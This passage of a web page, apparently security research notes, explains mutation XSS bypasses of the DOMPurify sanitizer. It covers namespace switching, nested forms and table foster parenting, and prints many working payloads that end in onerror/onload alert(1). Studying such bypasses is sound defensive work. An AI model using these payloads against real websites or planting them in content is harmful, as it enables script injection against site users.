</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>&lt;<span style="color:#f92672">svg</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">textarea</span>&gt;&lt;<span style="color:#f92672">desc</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;/</span><span style="color:#f92672">textarea</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#f92672">img</span> <span style="color:#f92672">src</span><span style="color:#f92672">=</span><span style="color:#f92672">x</span> <span style="color:#f92672">onerror</span><span style="color:#f92672">=</span><span style="color:#f92672">alert</span><span style="color:#f92672">(</span><span style="color:#f92672">1</span><span style="color:#f92672">)&gt;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">desc</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>&lt;<span style="color:#f92672">math</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">textarea</span>&gt;&lt;<span style="color:#f92672">mi</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/mi&gt;&lt;/math&gt;</span>
</span></span></code></pre></div><h3 id="namespace-switching-mxss-securitymb-2020">Namespace Switching MXSS SecurityMB 2020</h3>
<p><strong>Payload</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&lt;<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>&lt;/<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>&lt;<span style="color:#f92672">mglyph</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;/math&gt;&lt;img src onerror=alert(1)&gt;</span>
</span></span></code></pre></div><p><strong>Description</strong>
<em>HTML to SVG namespace Switch:</em></p>
<ul>
<li>The img tag ends up as a child of a style tag in the HTML namespace due to the presence of mtext during the first parsing stage. As a result, DOMPurify doesn&rsquo;t remove it. While this HTML isn’t immediately dangerous, it undergoes a mutation since form tags can&rsquo;t be nested in HTML. However, using a trick mentioned in the spec, it is possible to nest them during the first parsing stage. The parser mutates the form to conform to the spec.</li>
<li>On the second pass, the nested form is removed, and the mglyph element ends up directly below the mtext, switching it to the MathML namespace. This also changes the style element to MathML. Since img tags are not allowed in foreign content (like MathML), it moves back to the HTML namespace and is eventually executed.</li>
</ul>
<p><strong>Spec:</strong> If the adjusted current node is a MathML text integration point and the token is a start tag whose tag name is neither &ldquo;mglyph&rdquo; nor &ldquo;malignmark&rdquo;
<strong>Link:</strong> <a href="https://html.spec.whatwg.org/multipage/parsing.html#tree-construction">https://html.spec.whatwg.org/multipage/parsing.html#tree-construction</a></p>
<p><strong>Links</strong>
<em><a href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/</a></em></p>
<p><strong>Instead of style xmp can be used:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#e6db74">&#39;&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;xmp&gt;&lt;img src=x onerror=alert(1)&gt;&#39;</span>,{<span style="color:#a6e22e">ADD_TAGS</span><span style="color:#f92672">:</span>[<span style="color:#e6db74">&#39;xmp&#39;</span>]})
</span></span></code></pre></div><h4 id="multiple-variations-of-the-same-root-cause-namespace-confusion">Multiple variations of the same root cause namespace confusion:</h4>
<p><strong>Payload:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;<span style="color:#f92672">table</span>&gt;&lt;<span style="color:#f92672">mglyph</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">img</span> <span style="color:#f92672">src</span><span style="color:#f92672">=</span><span style="color:#f92672">x</span> <span style="color:#f92672">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alert(1)&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#f92672">table</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">or</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#f92672">&lt;</span><span style="color:#f92672">math</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#f92672">mtext</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#f92672">table</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#f92672">mglyph</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#f92672">style</span><span style="color:#f92672">&gt;&lt;!</span><span style="color:#f92672">--</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;--&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&#34;</span>&gt;
</span></span></code></pre></div><p><strong>Description for why table behaves that way:</strong></p>
<ul>
<li>Table tag has a parsing quirk called foster parenting, it moves the children if they are not allowed as children, so here mglyph style and img are all moved before the table</li>
</ul>
<p>Other variant:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;one&#39;</span>&gt;&lt;<span style="color:#f92672">audio</span>&gt;aa&lt;<span style="color:#f92672">altglyphdef</span>&gt;&lt;<span style="color:#f92672">animatecolor</span>&gt;&lt;<span style="color:#f92672">filter</span>&gt;&lt;<span style="color:#f92672">fieldset</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;two&#39;</span>&gt;&lt;/<span style="color:#f92672">fieldset</span>&gt;ccd&lt;/<span style="color:#f92672">a</span>&gt;gg&lt;<span style="color:#f92672">mglyph</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">a</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">#</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&#39;&gt;
</span></span></code></pre></div><h3 id="important-points-to-consider-from-now-on">Important Points to consider from now on:</h3>
<ol>
<li>
<p><a href="https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments:escapingString-3:~:text=It%20is%20possible%20that%20the%20output,not%20return%20the%20original%20tree%20structure">Main Root cause of MXSS in client-side sanitize</a>r: <em>It is possible that the output of this algorithm, if parsed with an <a href="https://html.spec.whatwg.org/multipage/parsing.html#html-parser">HTML parser</a>, will not return the original tree structure. Tree structures that do not roundtrip a serialize and reparse step can also be produced by the <a href="https://html.spec.whatwg.org/multipage/parsing.html#html-parser">HTML parser</a> itself, although such cases are typically non-conforming.</em></p>
<p><em>P(P(D))  ≠   P(D)</em></p>
<p>Actually it is Pn(D)   ≠  Pn−1(D)</p>
<p>Non-Idempotency: that repeated parsing yields different results after each pass. This captures the essence of mutation in the browser&rsquo;s parsing.</p>
<p>P here is parsing, D is the HTML string</p>
<p>Example:</p>
<p>D​=&lt;form&gt;&lt;div&gt;&lt;/form&gt;&lt;form&gt;&lt;/div&gt;&lt;/form&gt;</p>
<p>P(D)=&lt;form&gt;&lt;div&gt;&lt;/form&gt;&lt;form&gt;&lt;/div&gt;&lt;/form&gt;&lt;/form&gt;</p>
<p>P(P(D))=&lt;form&gt;&lt;div&gt;&lt;/div&gt;&lt;/form&gt;</p>
</li>
<li>
<p>In the HTML namespace, children of a &lt;style&gt; &lt;xmp&gt;  tag are treated as RAWTEXT state or just text. However, in SVG and MathML namespaces, children of the &lt;style&gt; tag are treated as actual elements, which can cause different parsing behavior.</p>
</li>
<li>
<p>Comments within a &lt;style&gt; tag are ignored in HTML, but in SVG and MathML, comments inside a &lt;style&gt; tag are not ignored and can affect how the content is parsed.</p>
</li>
<li>
<p>HTML entities (like &amp;amp;) are decoded in SVG and MathML, potentially altering the content during parsing.</p>
</li>
<li>
<p>In the case of tables, the parser uses a concept called &ldquo;fostering parent,&rdquo; which moves unwanted or misplaced elements outside of the table and continues with the parsing, ensuring the table structure remains correct.</p>
</li>
<li>
<p>The &lt;select&gt; tag actively removes any child elements that are not allowed, ensuring only valid content is retained.</p>
</li>
<li>
<p>While HTML does not allow nested forms, during the first parsing pass, it&rsquo;s possible to have a structure like &lt;form&gt;&lt;div&gt;&lt;/form&gt;&lt;form&gt;&lt;/div&gt;&lt;/form&gt;. However, in the next parsing pass, this will mutate to &lt;form&gt;&lt;div&gt;&lt;/form&gt;&lt;form&gt;&lt;/div&gt;&lt;/form&gt;&lt;/form&gt;, and eventually result in &lt;form&gt;&lt;div&gt;&lt;/form&gt;. This behavior is part of how browsers ensure that the document follows the HTML specification, resolving nested form issues through mutation.</p>
</li>
<li>
<p>Refere <a href="https://sonarsource.github.io/mxss-cheatsheet/#">https://sonarsource.github.io/mxss-cheatsheet/#</a> for more</p>
</li>
<li>
<p>We have 3 main namespaces: html, svg, math</p>
</li>
<li>
<p><strong>Switch</strong>: In the first parsing, during sanitization, our payload that executes JavaScript exists in one namespace, making it appear as safe HTML. At this stage, the payload might be within style tag text content, as an attribute value, or even as a comment, none of which are directly executable. However, during the browser&rsquo;s second HTML parsing, the content shifts to another namespace. As this switch happens, the payload is transformed, causing it to move out of the text content, attribute value, or comment where it was originally contained. This allows the embedded JavaScript to eventually execute.</p>
<ol>
<li>
<p>Example:<br>
<strong>Style tag HTML to MATH switch:</strong><br>
<strong>Payload:</strong> <code>&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=alert(1)&gt;&lt;/style&gt;&lt;/mglyph&gt;&lt;/form&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/form&gt;</code></p>
<p><strong>Parser in Sanitizer:</strong><br>
This weird form case mutates and creates following: <code>&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x&gt;</code>  &lt;- Notice it became nested forms<br>
<strong>Parser in innerHTML:</strong><br>
As nested forms are not allowed inner form is removed making following html: <code>&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;mglyp&gt;&lt;style&gt;&lt;img src=x onerror=x&gt; </code><br>
\</p>
</li>
</ol>
</li>
<li>
<p>The goal is to exploit the non-idempotent nature of HTML parsing to fool sanitizers. In the first parsing, the HTML appears innocent, with potentially dangerous elements hidden in ways that the sanitizer won&rsquo;t detect, such as within comments, attributes, or using namespaces like MathML or SVG. The sanitizer allows the document through, seeing it as safe. However, during the second parsing by the browser, the structure mutates—elements might shift between namespaces or become reinterpreted—revealing malicious content that can execute JavaScript or other harmful code, bypassing the initial sanitization.</p>
<p><strong>Or</strong></p>
<p>P(D)=Dsafe &lt;- sanitization</p>
<p>P(P(D))=Dmalicious &lt;- insertion to body</p>
</li>
</ol>
<h3 id="masatos-numerous-bypasses-when-removing-forbidden-tags">Masato’s numerous bypasses when removing forbidden tags:</h3>
<p>Description: DOMPurify removes certain tags but preserves the content inside them, which can be exploited for Mutation XSS (MXSS) through namespace switching. For example, the style tag resides inside the HTML namespace within a foreignObject element. DOMPurify removes the foreignObject tag but retains its content, causing the remaining content to switch to the SVG namespace. As a result, the malicious content that was initially safe in the HTML namespace now becomes executable as SVG tags, leading to the execution of the payload. This exploit leverages the way DOMPurify handles tag removal without completely removing the content inside.</p>
<p>Similar variation to Securitymb <!-- raw HTML omitted --><!-- raw HTML omitted --> but use a tag which gets removed by DOMpurify inbetween them like <code>&lt;svg&gt;&lt;foreignobject&gt;&lt;p&gt;</code> &lt;- valid dom but after sanitization it turns <code>&lt;svg&gt;&lt;p&gt;</code> &lt;- not valid dom, so <!-- raw HTML omitted --> kicks out</p>
<p>So, when content is not ignored and inserted to body, mxss can happen with below payloads</p>
<p>Payloads:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-html" data-lang="html"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>	&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">foreignobject</span>&gt;&lt;<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">p</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#960050;background-color:#1e0010">&amp;#</span><span style="color:#a6e22e">x3d</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)&lt;!</span><span style="color:#a6e22e">--</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;&lt;/<span style="color:#f92672">style</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>or
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">annotation-xml</span> <span style="color:#a6e22e">encoding</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html&#34;</span>&gt;&lt;<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">p</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#960050;background-color:#1e0010">&amp;#</span><span style="color:#a6e22e">x3d</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)&lt;!</span><span style="color:#a6e22e">--</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;&lt;/<span style="color:#f92672">style</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>//&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">p</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)&lt;!--&#34;</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;&lt;/<span style="color:#f92672">style</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>DOMPurify.sanitize(&#39;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;&lt;<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">p</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#960050;background-color:#1e0010">&amp;#</span><span style="color:#a6e22e">x3d</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)&lt;!</span><span style="color:#a6e22e">--</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;&lt;/<span style="color:#f92672">style</span>&gt;&#39;,{&#34;FORBID_TAGS&#34;:[&#34;title&#34;]})
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">foreignobject</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">p</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#960050;background-color:#1e0010">&amp;#</span><span style="color:#a6e22e">x3d</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)&lt;!</span><span style="color:#a6e22e">--</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;&lt;/<span style="color:#f92672">style</span>&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>DOMPurify.sanitize(&#39;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">desc</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">b</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#960050;background-color:#1e0010">&amp;#</span><span style="color:#a6e22e">x3d</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)&lt;!</span><span style="color:#a6e22e">--</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;&lt;/<span style="color:#f92672">style</span>&gt;&#39;,{&#34;FORBID_TAGS&#34;:[&#34;desc&#34;]})
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>DOMPurify.sanitize(&#39;&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">annotation-xml</span> <span style="color:#a6e22e">encoding</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html&#34;</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">img</span> <span style="color:#f92672">src</span><span style="color:#f92672">=</span><span style="color:#f92672">x</span> <span style="color:#f92672">onerror</span><span style="color:#f92672">=</span><span style="color:#f92672">alert</span><span style="color:#f92672">(</span><span style="color:#f92672">1</span><span style="color:#f92672">)&gt;</span>&lt;/<span style="color:#f92672">style</span>&gt;&#39;,{&#34;ADD_TAGS&#34;:[&#39;annotation-xml&#39;]})
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>DOMPurify.sanitize(&#39;&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mi</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">b</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">onload</span><span style="color:#960050;background-color:#1e0010">&amp;#</span><span style="color:#a6e22e">x3d</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">alert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">1</span><span style="color:#960050;background-color:#1e0010">)&lt;!</span><span style="color:#a6e22e">--</span><span style="color:#960050;background-color:#1e0010">&#34;</span>&gt;&lt;/<span style="color:#f92672">style</span>&gt;&#39;,{&#34;FORBID_TAGS&#34;:[&#34;mi&#34;]})
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>document.write(DOMPurify.sanitize(&#34;x&lt;<span style="color:#f92672">noframes</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">xmp</span>&gt;&lt;<span style="color:#f92672">b</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;/xmp&gt;&lt;img src=x onerror=alert(1)&gt;&#39;</span>&gt;&#34;,{ADD_TAGS:[&#34;xmp&#34;]}))
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>&lt;<span style="color:#f92672">xmp</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">b</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&#39;&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>&lt;<span style="color:#f92672">noembed</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">b</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&#39;&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>&lt;<span style="color:#f92672">noframes</span>&gt;&lt;<span style="color:#f92672">svg</span>&gt;&lt;<span style="color:#f92672">b</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#f92672">&lt;</span><span style="color:#f92672">b</span> <span style="color:#f92672">title</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>&lt;/<span style="color:#f92672">style</span>&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;&#39;&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>
